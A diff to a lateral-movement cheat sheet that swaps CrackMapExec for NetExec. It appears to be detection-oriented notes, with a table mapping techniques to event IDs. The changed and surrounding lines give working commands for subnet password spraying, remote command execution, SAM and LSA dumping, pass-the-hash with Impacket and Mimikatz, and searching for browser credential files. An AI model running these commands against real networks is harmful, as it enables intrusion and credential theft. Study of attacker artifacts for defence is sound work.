@@ -1,6 +1,6 @@
 # Lateral Movement — Offensive Techniques & Commands
 
-> Sources: RTFM v3, MITRE ATT&CK TA0008, CrackMapExec wiki, Impacket documentation
+> Sources: RTFM v3, MITRE ATT&CK TA0008, NetExec wiki, Impacket documentation
 > Purpose: Know how attackers move laterally to identify the artifacts they generate.
 
 ---
@@ -109,11 +109,11 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t
 ### SMB / Admin Shares (T1021.002)
 
 ```bash
-# CrackMapExec — spray and execute
-crackmapexec smb 10.10.10.0/24 -u admin -p password --exec-method smbexec -x "whoami"
-crackmapexec smb 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
-crackmapexec smb 10.10.10.5 -u admin -p password --sam  # Dump SAM
-crackmapexec smb 10.10.10.5 -u admin -p password --lsa  # Dump LSA
+# NetExec — spray and execute
+netexec smb 10.10.10.0/24 -u admin -p password --exec-method smbexec -x "whoami"
+netexec smb 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
+netexec smb 10.10.10.5 -u admin -p password --sam  # Dump SAM
+netexec smb 10.10.10.5 -u admin -p password --lsa  # Dump LSA
 
 # smbclient (file access)
 smbclient //10.10.10.5/C$ -U 'domain/admin%password'
@@ -155,9 +155,9 @@ psexec.py -hashes :NTLM_HASH domain/admin@10.10.10.5
 wmiexec.py -hashes :NTLM_HASH domain/admin@10.10.10.5
 smbexec.py -hashes :NTLM_HASH domain/admin@10.10.10.5
 
-# CrackMapExec with hash
-crackmapexec smb 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
-crackmapexec winrm 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
+# NetExec with hash
+netexec smb 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
+netexec winrm 10.10.10.5 -u admin -H NTLM_HASH -x "whoami"
 
 # Mimikatz PTH (creates new process with stolen token)
 # sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe
@@ -340,6 +340,6 @@ find / -name "Login Data" -o -name "logins.json" -o -name "key4.db" 2>/dev/null
 | DCOM | Event 10016, DCOMLaunch events, unusual COM object instantiation |
 | Pass-the-Hash | LogonType 3/9 with NTLM, Event 4624 from unusual source, Mimikatz artifacts |
 | SSH lateral | auth.log accepted connections, agent forwarding, multiple sessions from single source |
-| CrackMapExec | Multiple SMB auth attempts across subnet, rapid sequential logons |
+| NetExec | Multiple SMB auth attempts across subnet, rapid sequential logons |
 | Credential dump | LSASS access (Sysmon Event 10), SAM/SYSTEM registry saves, procdump execution |
 | DCSync | Directory replication events (Event 4662), unusual replication source |
